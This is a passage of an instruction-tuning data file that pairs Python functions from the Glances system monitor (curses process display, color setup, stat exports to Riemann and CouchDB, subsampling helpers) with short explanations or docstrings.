           msg = self.layout_header['iow'].format(\"?\")\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n\n        # Command line\n        # If no command line for the process is available, fallback to\n        # the bare process name instead\n        if 'cmdline' in p:\n            cmdline = p['cmdline']\n        else:\n            cmdline = '?'\n        try:\n            if cmdline:\n                path, cmd, arguments = split_cmdline(cmdline)\n                if os.path.isdir(path) and not args.process_short_name:\n                    msg = self.layout_stat['command'].format(path) + os.sep\n                    ret.append(self.curse_add_line(msg, splittable=True))\n                    ret.append(self.curse_add_line(cmd, decoration='PROCESS', splittable=True))\n                else:\n                    msg = self.layout_stat['command'].format(cmd)\n                    ret.append(self.curse_add_line(msg, decoration='PROCESS', splittable=True))\n                if arguments:\n                    msg = ' ' + self.layout_stat['command'].format(arguments)\n                    ret.append(self.curse_add_line(msg, splittable=True))\n            else:\n                msg = self.layout_stat['name'].format(p['name'])\n                ret.append(self.curse_add_line(msg, splittable=True))\n        except (TypeError, UnicodeEncodeError) as e:\n            # Avoid crach after running fine for several hours #1335\n            logger.debug(\"Can not decode command line '{}' ({})\".format(cmdline, e))\n            ret.append(self.curse_add_line('', splittable=True))\n\n        # Add extended stats but only for the top processes\n        if first and 'extended_stats' in p and args.enable_process_extended:\n            # Left padding\n            xpad = ' ' * 13\n            # First line is CPU affinity\n            if 'cpu_affinity' in p and p['cpu_affinity'] is not None:\n                ret.append(self.curse_new_line())\n                msg = xpad + 'CPU affinity: ' + str(len(p['cpu_affinity'])) + ' cores'\n                ret.append(self.curse_add_line(msg, splittable=True))\n            # Second line is memory info\n            if 'memory_info' in p and \\\n               p['memory_info'] is not None:\n                ret.append(self.curse_new_line())\n                msg = '{}Memory info: {}'.format(xpad, p['memory_info'])\n                if 'memory_swap' in p and p['memory_swap'] is not None:\n                    msg += ' swap ' + self.auto_unit(p['memory_swap'], low_precision=False)\n                ret.append(self.curse_add_line(msg, splittable=True))\n            # Third line is for open files/network sessions\n            msg = ''\n            if 'num_threads' in p and p['num_threads'] is not None:\n                msg += str(p['num_threads']) + ' threads '\n            if 'num_fds' in p and p['num_fds'] is not None:\n                msg += str(p['num_fds']) + ' files '\n            if 'num_handles' in p and p['num_handles'] is not None:\n                msg += str(p['num_handles']) + ' handles '\n            if 'tcp' in p and p['tcp'] is not None:\n                msg += str(p['tcp']) + ' TCP '\n            if 'udp' in p and p['udp'] is not None:\n                msg += str(p['udp']) + ' UDP'\n            if msg != '':\n                ret.append(self.curse_new_line())\n                msg = xpad + 'Open: ' + msg\n                ret.append(self.curse_add_line(msg, splittable=True))\n            # Fouth line is IO nice level (only Linux and Windows OS)\n            if 'ionice' in p and \\\n               p['ionice'] is not None \\\n               and hasattr(p['ionice'], 'ioclass'):\n                ret.append(self.curse_new_line())\n                msg = xpad + 'IO nice: '\n                k = 'Class is '\n                v = p['ionice'].ioclass\n                # Linux: The scheduling class. 0 for none, 1 for real time, 2 for best-effort, 3 for idle.\n                # Windows: On Windows only ioclass is used and it can be set to 2 (normal), 1 (low) or 0 (very low).\n                if WINDOWS:\n                    if v == 0:\n                        msg += k + 'Very Low'\n                    elif v == 1:\n                        msg += k + 'Low'\n                    elif v == 2:\n                        msg += 'No specific I/O priority'\n                    else:\n                        msg += k + str(v)\n                else:\n                    if v == 0:\n                        msg += 'No specific I/O priority'\n                    elif v == 1:\n                        msg += k + 'Real Time'\n                    elif v == 2:\n                        msg += k + 'Best Effort'\n                    elif v == 3:\n                        msg += k + 'IDLE'\n                    else:\n                        msg += k + str(v)\n                #  value is a number which goes from 0 to 7.\n                # The higher the value, the lower the I/O priority of the process.\n                if hasattr(p['ionice'], 'value') and p['ionice'].value != 0:\n                    msg += ' (value %s/7)' % str(p['ionice'].value)\n                ret.append(self.curse_add_line(msg, splittable=True))\n\n        return ret", "response": "Get the curses data for a process."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or args.disable_process:\n            return ret\n\n        # Compute the sort key\n        process_sort_key = glances_processes.sort_key\n\n        # Header\n        self.__msg_curse_header(ret, process_sort_key, args)\n\n        # Process list\n        # Loop over processes (sorted by the sort key previously compute)\n        first = True\n        for p in self.__sort_stats(process_sort_key):\n            ret.extend(self.get_process_curses_data(p, first, args))\n            # End of extended stats\n            first = False\n        if glances_processes.process_filter is not None:\n            if args.reset_minmax_tag:\n                args.reset_minmax_tag = not args.reset_minmax_tag\n                self.__mmm_reset()\n            self.__msg_curse_sum(ret, args=args)\n            self.__msg_curse_sum(ret, mmm='min', args=args)\n            self.__msg_curse_sum(ret, mmm='max', args=args)\n\n        # Return the message with decoration\n        return ret", "response": "Return the dict to display in the curse interface."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding the header and add it to the ret dict.", "response": "def __msg_curse_header(self, ret, process_sort_key, args=None):\n        \"\"\"Build the header and add it to the ret dict.\"\"\"\n        sort_style = 'SORT'\n\n        if args.disable_irix and 0 < self.nb_log_core < 10:\n            msg = self.layout_header['cpu'].format('CPU%/' + str(self.nb_log_core))\n        elif args.disable_irix and self.nb_log_core != 0:\n            msg = self.layout_header['cpu'].format('CPU%/C')\n        else:\n            msg = self.layout_header['cpu'].format('CPU%')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'cpu_percent' else 'DEFAULT'))\n        msg = self.layout_header['mem'].format('MEM%')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'memory_percent' else 'DEFAULT'))\n        msg = self.layout_header['virt'].format('VIRT')\n        ret.append(self.curse_add_line(msg, optional=True))\n        msg = self.layout_header['res'].format('RES')\n        ret.append(self.curse_add_line(msg, optional=True))\n        msg = self.layout_header['pid'].format('PID', width=self.__max_pid_size())\n        ret.append(self.curse_add_line(msg))\n        msg = self.layout_header['user'].format('USER')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'username' else 'DEFAULT'))\n        msg = self.layout_header['time'].format('TIME+')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'cpu_times' else 'DEFAULT', optional=True))\n        msg = self.layout_header['thread'].format('THR')\n        ret.append(self.curse_add_line(msg))\n        msg = self.layout_header['nice'].format('NI')\n        ret.append(self.curse_add_line(msg))\n        msg = self.layout_header['status'].format('S')\n        ret.append(self.curse_add_line(msg))\n        msg = self.layout_header['ior'].format('R/s')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'io_counters' else 'DEFAULT', optional=True, additional=True))\n        msg = self.layout_header['iow'].format('W/s')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'io_counters' else 'DEFAULT', optional=True, additional=True))\n        msg = self.layout_header['command'].format('Command')\n        ret.append(self.curse_add_line(msg, sort_style if process_sort_key == 'name' else 'DEFAULT'))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __msg_curse_sum(self, ret, sep_char='_', mmm=None, args=None):\n        ret.append(self.curse_new_line())\n        if mmm is None:\n            ret.append(self.curse_add_line(sep_char * 69))\n            ret.append(self.curse_new_line())\n        # CPU percent sum\n        msg = self.layout_stat['cpu'].format(self.__sum_stats('cpu_percent', mmm=mmm))\n        ret.append(self.curse_add_line(msg,\n                                       decoration=self.__mmm_deco(mmm)))\n        # MEM percent sum\n        msg = self.layout_stat['mem'].format(self.__sum_stats('memory_percent', mmm=mmm))\n        ret.append(self.curse_add_line(msg,\n                                       decoration=self.__mmm_deco(mmm)))\n        # VIRT and RES memory sum\n        if 'memory_info' in self.stats[0] and self.stats[0]['memory_info'] is not None and self.stats[0]['memory_info'] != '':\n            # VMS\n            msg = self.layout_stat['virt'].format(self.auto_unit(self.__sum_stats('memory_info', indice=1, mmm=mmm), low_precision=False))\n            ret.append(self.curse_add_line(msg,\n                                           decoration=self.__mmm_deco(mmm),\n                                           optional=True))\n            # RSS\n            msg = self.layout_stat['res'].format(self.auto_unit(self.__sum_stats('memory_info', indice=0, mmm=mmm), low_precision=False))\n            ret.append(self.curse_add_line(msg,\n                                           decoration=self.__mmm_deco(mmm),\n                                           optional=True))\n        else:\n            msg = self.layout_header['virt'].format('')\n            ret.append(self.curse_add_line(msg))\n            msg = self.layout_header['res'].format('')\n            ret.append(self.curse_add_line(msg))\n        # PID\n        msg = self.layout_header['pid'].format('', width=self.__max_pid_size())\n        ret.append(self.curse_add_line(msg))\n        # USER\n        msg = self.layout_header['user'].format('')\n        ret.append(self.curse_add_line(msg))\n        # TIME+\n        msg = self.layout_header['time'].format('')\n        ret.append(self.curse_add_line(msg, optional=True))\n        # THREAD\n        msg = self.layout_header['thread'].format('')\n        ret.append(self.curse_add_line(msg))\n        # NICE\n        msg = self.layout_header['nice'].format('')\n        ret.append(self.curse_add_line(msg))\n        # STATUS\n        msg = self.layout_header['status'].format('')\n        ret.append(self.curse_add_line(msg))\n        # IO read/write\n        if 'io_counters' in self.stats[0] and mmm is None:\n            # IO read\n            io_rs = int((self.__sum_stats('io_counters', 0) - self.__sum_stats('io_counters', indice=2, mmm=mmm)) / self.stats[0]['time_since_update'])\n            if io_rs == 0:\n                msg = self.layout_stat['ior'].format('0')\n            else:\n                msg = self.layout_stat['ior'].format(self.auto_unit(io_rs, low_precision=True))\n            ret.append(self.curse_add_line(msg,\n                                           decoration=self.__mmm_deco(mmm),\n                                           optional=True, additional=True))\n            # IO write\n            io_ws = int((self.__sum_stats('io_counters', 1) - self.__sum_stats('io_counters', indice=3, mmm=mmm)) / self.stats[0]['time_since_update'])\n            if io_ws == 0:\n                msg = self.layout_stat['iow'].format('0')\n            else:\n                msg = self.layout_stat['iow'].format(self.auto_unit(io_ws, low_precision=True))\n            ret.append(self.curse_add_line(msg,\n                                           decoration=self.__mmm_deco(mmm),\n                                           optional=True, additional=True))\n        else:\n            msg = self.layout_header['ior'].format('')\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n            msg = self.layout_header['iow'].format('')\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n        if mmm is None:\n            msg = ' < {}'.format('current')\n            ret.append(self.curse_add_line(msg, optional=True))\n        else:\n            msg = ' < {}'.format(mmm)\n            ret.append(self.curse_add_line(msg, optional=True))\n            msg = ' (\\'M\\' to reset)'\n            ret.append(self.curse_add_line(msg, optional=True))", "response": "Build the sum message for the current page and add it to the ret dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __sum_stats(self, key, indice=None, mmm=None):\n        # Compute stats summary\n        ret = 0\n        for p in self.stats:\n            if key not in p:\n                # Correct issue #1188\n                continue\n            if p[key] is None:\n                # Correct https://github.com/nicolargo/glances/issues/1105#issuecomment-363553788\n                continue\n            if indice is None:\n                ret += p[key]\n            else:\n                ret += p[key][indice]\n\n        # Manage Min/Max/Mean\n        mmm_key = self.__mmm_key(key, indice)\n        if mmm == 'min':\n            try:\n                if self.mmm_min[mmm_key] > ret:\n                    self.mmm_min[mmm_key] = ret\n            except AttributeError:\n                self.mmm_min = {}\n                return 0\n            except KeyError:\n                self.mmm_min[mmm_key] = ret\n            ret = self.mmm_min[mmm_key]\n        elif mmm == 'max':\n            try:\n                if self.mmm_max[mmm_key] < ret:\n                    self.mmm_max[mmm_key] = ret\n            except AttributeError:\n                self.mmm_max = {}\n                return 0\n            except KeyError:\n                self.mmm_max[mmm_key] = ret\n            ret = self.mmm_max[mmm_key]\n\n        return ret", "response": "Compute the sum of the stats value for the given key."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the stats dict sorted by sortedby.", "response": "def __sort_stats(self, sortedby=None):\n        \"\"\"Return the stats (dict) sorted by (sortedby).\"\"\"\n        return sort_stats(self.stats, sortedby,\n                          reverse=glances_processes.sort_reverse)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef build_header(self, plugin, attribute, stat):\n        line = ''\n\n        if attribute is not None:\n            line += '{}.{}{}'.format(plugin, attribute, self.separator)\n        else:\n            if isinstance(stat, dict):\n                for k in stat.keys():\n                    line += '{}.{}{}'.format(plugin,\n                                             str(k),\n                                             self.separator)\n            elif isinstance(stat, list):\n                for i in stat:\n                    if isinstance(i, dict) and 'key' in i:\n                        for k in i.keys():\n                            line += '{}.{}.{}{}'.format(plugin,\n                                                        str(i[i['key']]),\n                                                        str(k),\n                                                        self.separator)\n            else:\n                line += '{}{}'.format(plugin, self.separator)\n\n        return line", "response": "Build and return the header line"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef build_data(self, plugin, attribute, stat):\n        line = ''\n\n        if attribute is not None:\n            line += '{}{}'.format(str(stat.get(attribute, self.na)),\n                                  self.separator)\n        else:\n            if isinstance(stat, dict):\n                for v in stat.values():\n                    line += '{}{}'.format(str(v), self.separator)\n            elif isinstance(stat, list):\n                for i in stat:\n                    if isinstance(i, dict) and 'key' in i:\n                        for v in i.values():\n                            line += '{}{}'.format(str(v), self.separator)\n            else:\n                line += '{}{}'.format(str(stat), self.separator)\n\n        return line", "response": "Build and return the data line"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self,\n               stats,\n               duration=3):\n        \"\"\"Display stats to stdout.\n        Refresh every duration second.\n        \"\"\"\n        # Build the stats list\n        line = ''\n        for plugin, attribute in self.plugins_list:\n            # Check if the plugin exist and is enable\n            if plugin in stats.getPluginsList() and \\\n               stats.get_plugin(plugin).is_enable():\n                stat = stats.get_plugin(plugin).get_export()\n            else:\n                continue\n\n            # Build the line to display (header or data)\n            if self.header:\n                line += self.build_header(plugin, attribute, stat)\n            else:\n                line += self.build_data(plugin, attribute, stat)\n\n        # Display the line (without the last 'separator')\n        printandflush(line[:-1])\n\n        # Display header one time\n        self.header = False\n\n        # Wait until next refresh\n        if duration > 0:\n            time.sleep(duration)", "response": "Display stats to stdout."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef init(self):\n        if not self.export_enable:\n            return None\n        try:\n            client = bernhard.Client(host=self.host, port=self.port)\n            return client\n        except Exception as e:\n            logger.critical(\"Connection to Riemann failed : %s \" % e)\n            return None", "response": "Init the connection to the Riemann server."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef export(self, name, columns, points):\n        for i in range(len(columns)):\n            if not isinstance(points[i], Number):\n                continue\n            else:\n                data = {'host': self.hostname, 'service': name + \" \" + columns[i], 'metric': points[i]}\n                logger.debug(data)\n                try:\n                    self.client.send(data)\n                except Exception as e:\n                    logger.error(\"Cannot export stats to Riemann (%s)\" % e)", "response": "Write the points in Riemann."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the elapsed time since last update.", "response": "def getTimeSinceLastUpdate(IOType):\n    \"\"\"Return the elapsed time since last update.\"\"\"\n    global last_update_times\n    # assert(IOType in ['net', 'disk', 'process_disk'])\n    current_time = time()\n    last_time = last_update_times.get(IOType)\n    if not last_time:\n        time_since_update = 1\n    else:\n        time_since_update = current_time - last_time\n    last_update_times[IOType] = current_time\n    return time_since_update"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomputing a simple mean subsampling.", "response": "def subsample(data, sampling):\n    \"\"\"Compute a simple mean subsampling.\n\n    Data should be a list of numerical itervalues\n\n    Return a subsampled list of sampling lenght\n    \"\"\"\n    if len(data) <= sampling:\n        return data\n    sampling_length = int(round(len(data) / float(sampling)))\n    return [mean(data[s * sampling_length:(s + 1) * sampling_length]) for s in range(0, sampling)]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef time_serie_subsample(data, sampling):\n    if len(data) <= sampling:\n        return data\n    t = [t[0] for t in data]\n    v = [t[1] for t in data]\n    sampling_length = int(round(len(data) / float(sampling)))\n    t_subsampled = [t[s * sampling_length:(s + 1) * sampling_length][0] for s in range(0, sampling)]\n    v_subsampled = [mean(v[s * sampling_length:(s + 1) * sampling_length]) for s in range(0, sampling)]\n    return list(zip(t_subsampled, v_subsampled))", "response": "Compute a simple mean subsampling."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwrites the points to the CouchDB server.", "response": "def export(self, name, columns, points):\n        \"\"\"Write the points to the CouchDB server.\"\"\"\n        logger.debug(\"Export {} stats to CouchDB\".format(name))\n\n        # Create DB input\n        data = dict(zip(columns, points))\n\n        # Set the type to the current stat name\n        data['type'] = name\n        data['time'] = couchdb.mapping.DateTimeField()._to_json(datetime.now())\n\n        # Write input to the CouchDB database\n        # Result can be view: http://127.0.0.1:5984/_utils\n        try:\n            self.client[self.db].save(data)\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to CouchDB ({})\".format(name, e))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n\n            # The psutil 2.0 include psutil.cpu_count() and psutil.cpu_count(logical=False)\n            # Return a dict with:\n            # - phys: physical cores only (hyper thread CPUs are excluded)\n            # - log: logical CPUs in the system\n            # Return None if undefine\n            try:\n                stats[\"phys\"] = psutil.cpu_count(logical=False)\n                stats[\"log\"] = psutil.cpu_count()\n            except NameError:\n                self.reset()\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # http://stackoverflow.com/questions/5662467/how-to-find-out-the-number-of-cpus-using-snmp\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update core stats.\n\n        Stats is a dict (with both physical and log cpu number) instead of a integer."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_theme(self, name):\n        return getattr(self.args, 'theme_' + name) or self.theme['name'] == name", "response": "Return True if the theme name should be used."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _init_colors(self):\n\n        # Set curses options\n        try:\n            if hasattr(curses, 'start_color'):\n                curses.start_color()\n            if hasattr(curses, 'use_default_colors'):\n                curses.use_default_colors()\n        except Exception as e:\n            logger.warning('Error initializing terminal color ({})'.format(e))\n\n        # Init colors\n        if self.args.disable_bold:\n            A_BOLD = 0\n            self.args.disable_bg = True\n        else:\n            A_BOLD = curses.A_BOLD\n\n        self.title_color = A_BOLD\n        self.title_underline_color = A_BOLD | curses.A_UNDERLINE\n        self.help_color = A_BOLD\n\n        if curses.has_colors():\n            # The screen is compatible with a colored design\n            if self.is_theme('white'):\n                # White theme: black ==> white\n                curses.init_pair(1, curses.COLOR_BLACK, -1)\n            else:\n                curses.init_pair(1, curses.COLOR_WHITE, -1)\n            if self.args.disable_bg:\n                curses.init_pair(2, curses.COLOR_RED, -1)\n                curses.init_pair(3, curses.COLOR_GREEN, -1)\n                curses.init_pair(4, curses.COLOR_BLUE, -1)\n                curses.init_pair(5, curses.COLOR_MAGENTA, -1)\n            else:\n                curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_RED)\n                curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_GREEN)\n                curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLUE)\n                curses.init_pair(5, curses.COLOR_WHITE, curses.COLOR_MAGENTA)\n            curses.init_pair(6, curses.COLOR_RED, -1)\n            curses.init_pair(7, curses.COLOR_GREEN, -1)\n            curses.init_pair(8, curses.COLOR_BLUE, -1)\n\n            # Colors text styles\n            if curses.COLOR_PAIRS > 8:\n                try:\n                    curses.init_pair(9, curses.COLOR_MAGENTA, -1)\n                except Exception:\n                    if self.is_theme('white'):\n                        curses.init_pair(9, curses.COLOR_BLACK, -1)\n                    else:\n                        curses.init_pair(9, curses.COLOR_WHITE, -1)\n                try:\n                    curses.init_pair(10, curses.COLOR_CYAN, -1)\n                except Exception:\n                    if self.is_theme('white'):\n                        curses.init_pair(10, curses.COLOR_BLACK, -1)\n                    else:\n                        curses.init_pair(10, curses.COLOR_WHITE, -1)\n\n                self.ifWARNING_color2 = curses.color_pair(9) | A_BOLD\n                self.ifCRITICAL_color2 = curses.color_pair(6) | A_BOLD\n                self.filter_color = curses.color_pair(10) | A_BOLD\n\n            self.no_color = curses.color_pair(1)\n            self.default_color = curses.color_pair(3) | A_BOLD\n            self.nice_color = curses.color_pair(9)\n            self.cpu_time_color = curses.color_pair(9)\n            self.ifCAREFUL_color = curses.color_pair(4) | A_BOLD\n            self.ifWARNING_color = curses.color_pair(5) | A_BOLD\n            self.ifCRITICAL_color = curses.color_pair(2) | A_BOLD\n            self.default_color2 = curses.color_pair(7)\n            self.ifCAREFUL_color2 = curses.color_pair(8) | A_BOLD\n\n        else:\n            # The screen is NOT compatible with a colored design\n            # switch to B&W text styles\n            self.no_color = curses.A_NORMAL\n            self.default_color = curses.A_NORMAL\n            self.nice_color = A_BOLD\n            self.cpu_time_color = A_BOLD\n            self.ifCAREFUL_color = curses.A_UNDERLINE\n            self.ifWARNING_color = A_BOLD\n            self.ifCRITICAL_color = curses.A_REVERSE\n            self.default_color2 = curses.A_NORMAL\n            self.ifCAREFUL_color2 = curses.A_UNDERLINE\n            self.ifWARNING_color2 = A_BOLD\n            self.ifCRITICAL_color2 = curses.A_REVERSE\n            self.filter_color = A_BOLD\n\n        # Define the colors list (hash table) for stats\n        self.colors_list = {\n            'DEFAULT': self.no_color,\n            'UNDERLINE': curses.A_UNDERLINE,\n            'BOLD': A_BOLD,\n            'SORT': A_BOLD,\n            'OK': self.default_color2,\n            'MAX': self.default_color2 | curses.A_BOLD,\n            'FILTER': self.filter_color,\n            'TITLE': self.title_color,\n            'PROCESS': self.default_color2,\n            'STATUS': self.default_color2,\n            'NICE': self.nice_color,\n            'CPU_TIME': self.cpu_time_color,\n            'CAREFUL': self.ifCAREFUL_color2,\n            'WARNING': self.ifWARNING_color2,\n            'CRITICAL': self.ifCRITICAL_color2,\n            'OK_LOG': self.default_color,\n            'CAREFUL_LOG': self.ifCAREFUL_color,\n            'WARNING_LOG': self.ifWARNING_color,\n            'CRITICAL_LOG': self.ifCRITICAL_color,\n            'PASSWORD': curses.A_PROTECT\n        }", "response": "Initialize the colors for the current terminal."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef loop_position(self):\n        for i, v in enumerate(self._sort_loop):\n            if v == glances_processes.sort_key:\n                return i\n        return 0", "response": "Return the current sort in the loop"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndisabling the full quicklook mode", "response": "def enable_fullquicklook(self):\n        \"\"\"Disable the full quicklook mode\"\"\"\n        self.args.disable_quicklook = False\n        for p in ['cpu', 'gpu', 'mem', 'memswap']:\n            setattr(self.args, 'disable_' + p, True)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a dict with all the stats display.", "response": "def __get_stat_display(self, stats, layer):\n        \"\"\"Return a dict of dict with all the stats display.\n        stats: Global stats dict\n        layer: ~ cs_status\n            \"None\": standalone or server mode\n            \"Connected\": Client is connected to a Glances server\n            \"SNMP\": Client is connected to a SNMP server\n            \"Disconnected\": Client is disconnected from the server\n\n        :returns: dict of dict\n            * key: plugin name\n            * value: dict returned by the get_stats_display Plugin method\n        \"\"\"\n        ret = {}\n\n        for p in stats.getPluginsList(enable=False):\n            if p == 'quicklook' or p == 'processlist':\n                # processlist is done later\n                # because we need to know how many processes could be displayed\n                continue\n\n            # Compute the plugin max size\n            plugin_max_width = None\n            if p in self._left_sidebar:\n                plugin_max_width = max(self._left_sidebar_min_width,\n                                       self.screen.getmaxyx()[1] - 105)\n                plugin_max_width = min(self._left_sidebar_max_width,\n                                       plugin_max_width)\n\n            # Get the view\n            ret[p] = stats.get_plugin(p).get_stats_display(args=self.args,\n                                                           max_width=plugin_max_width)\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef display(self, stats, cs_status=None):\n        # Init the internal line/column for Glances Curses\n        self.init_line_column()\n\n        # Update the stats messages\n        ###########################\n\n        # Get all the plugins but quicklook and proceslist\n        self.args.cs_status = cs_status\n        __stat_display = self.__get_stat_display(stats, layer=cs_status)\n\n        # Adapt number of processes to the available space\n        max_processes_displayed = (\n            self.screen.getmaxyx()[0] - 11 -\n            (0 if 'docker' not in __stat_display else\n                self.get_stats_display_height(__stat_display[\"docker\"])) -\n            (0 if 'processcount' not in __stat_display else\n                self.get_stats_display_height(__stat_display[\"processcount\"])) -\n            (0 if 'amps' not in __stat_display else\n                self.get_stats_display_height(__stat_display[\"amps\"])) -\n            (0 if 'alert' not in __stat_display else\n                self.get_stats_display_height(__stat_display[\"alert\"])))\n\n        try:\n            if self.args.enable_process_extended:\n                max_processes_displayed -= 4\n        except AttributeError:\n            pass\n        if max_processes_displayed < 0:\n            max_processes_displayed = 0\n        if (glances_processes.max_processes is None or\n                glances_processes.max_processes != max_processes_displayed):\n            logger.debug(\"Set number of displayed processes to {}\".format(max_processes_displayed))\n            glances_processes.max_processes = max_processes_displayed\n\n        # Get the processlist\n        __stat_display[\"processlist\"] = stats.get_plugin(\n            'processlist').get_stats_display(args=self.args)\n\n        # Display the stats on the curses interface\n        ###########################################\n\n        # Help screen (on top of the other stats)\n        if self.args.help_tag:\n            # Display the stats...\n            self.display_plugin(\n                stats.get_plugin('help').get_stats_display(args=self.args))\n            # ... and exit\n            return False\n\n        # =====================================\n        # Display first line (system+ip+uptime)\n        # Optionnaly: Cloud on second line\n        # =====================================\n        self.__display_header(__stat_display)\n\n        # ==============================================================\n        # Display second line (<SUMMARY>+CPU|PERCPU+<GPU>+LOAD+MEM+SWAP)\n        # ==============================================================\n        self.__display_top(__stat_display, stats)\n\n        # ==================================================================\n        # Display left sidebar (NETWORK+PORTS+DISKIO+FS+SENSORS+Current time)\n        # ==================================================================\n        self.__display_left(__stat_display)\n\n        # ====================================\n        # Display right stats (process and co)\n        # ====================================\n        self.__display_right(__stat_display)\n\n        # =====================\n        # Others popup messages\n        # =====================\n\n        # Display edit filter popup\n        # Only in standalone mode (cs_status is None)\n        if self.edit_filter and cs_status is None:\n            new_filter = self.display_popup(\n                'Process filter pattern: \\n\\n' +\n                'Examples:\\n' +\n                '- python\\n' +\n                '- .*python.*\\n' +\n                '- /usr/lib.*\\n' +\n                '- name:.*nautilus.*\\n' +\n                '- cmdline:.*glances.*\\n' +\n                '- username:nicolargo\\n' +\n                '- username:^root        ',\n                is_input=True,\n                input_value=glances_processes.process_filter_input)\n            glances_processes.process_filter = new_filter\n        elif self.edit_filter and cs_status is not None:\n            self.display_popup('Process filter only available in standalone mode')\n        self.edit_filter = False\n\n        # Display graph generation popup\n        if self.args.generate_graph:\n            self.display_popup('Generate graph in {}'.format(self.args.export_graph_path))\n\n        return True", "response": "Display the stats on the screen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndisplay the firsts lines in the Curses interface.", "response": "def __display_header(self, stat_display):\n        \"\"\"Display the firsts lines (header) in the Curses interface.\n\n        system + ip + uptime\n        (cloud)\n        \"\"\"\n        # First line\n        self.new_line()\n        self.space_between_column = 0\n        l_uptime = (self.get_stats_display_width(stat_display[\"system\"]) +\n                    self.get_stats_display_width(stat_display[\"ip\"]) +\n                    self.get_stats_display_width(stat_display[\"uptime\"]) + 1)\n        self.display_plugin(\n            stat_display[\"system\"],\n            display_optional=(self.screen.getmaxyx()[1] >= l_uptime))\n        self.space_between_column = 3\n        self.new_column()\n        self.display_plugin(stat_display[\"ip\"])\n        self.new_column()\n        self.display_plugin(\n            stat_display[\"uptime\"],\n            add_space=-(self.get_stats_display_width(stat_display[\"cloud\"]) != 0))\n        # Second line (optional)\n        self.init_column()\n        self.new_line()\n        self.display_plugin(stat_display[\"cloud\"])"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndisplays the second line in the Curses interface.", "response": "def __display_top(self, stat_display, stats):\n        \"\"\"Display the second line in the Curses interface.\n\n        <QUICKLOOK> + CPU|PERCPU + <GPU> + MEM + SWAP + LOAD\n        \"\"\"\n        self.init_column()\n        self.new_line()\n\n        # Init quicklook\n        stat_display['quicklook'] = {'msgdict': []}\n\n        # Dict for plugins width\n        plugin_widths = {}\n        for p in self._top:\n            plugin_widths[p] = self.get_stats_display_width(stat_display.get(p, 0)) if hasattr(self.args, 'disable_' + p) else 0\n\n        # Width of all plugins\n        stats_width = sum(itervalues(plugin_widths))\n\n        # Number of plugin but quicklook\n        stats_number = sum([int(stat_display[p]['msgdict'] != []) for p in self._top if not getattr(self.args, 'disable_' + p)])\n\n        if not self.args.disable_quicklook:\n            # Quick look is in the place !\n            if self.args.full_quicklook:\n                quicklook_width = self.screen.getmaxyx()[1] - (stats_width + 8 + stats_number * self.space_between_column)\n            else:\n                quicklook_width = min(self.screen.getmaxyx()[1] - (stats_width + 8 + stats_number * self.space_between_column),\n                                      self._quicklook_max_width - 5)\n            try:\n                stat_display[\"quicklook\"] = stats.get_plugin(\n                    'quicklook').get_stats_display(max_width=quicklook_width, args=self.args)\n            except AttributeError as e:\n                logger.debug(\"Quicklook plugin not available (%s)\" % e)\n            else:\n                plugin_widths['quicklook'] = self.get_stats_display_width(stat_display[\"quicklook\"])\n                stats_width = sum(itervalues(plugin_widths)) + 1\n            self.space_between_column = 1\n            self.display_plugin(stat_display[\"quicklook\"])\n            self.new_column()\n\n        # Compute spaces between plugins\n        # Note: Only one space between Quicklook and others\n        plugin_display_optional = {}\n        for p in self._top:\n            plugin_display_optional[p] = True\n        if stats_number > 1:\n            self.space_between_column = max(1, int((self.screen.getmaxyx()[1] - stats_width) / (stats_number - 1)))\n            for p in ['mem', 'cpu']:\n                # No space ? Remove optional stats\n                if self.space_between_column < 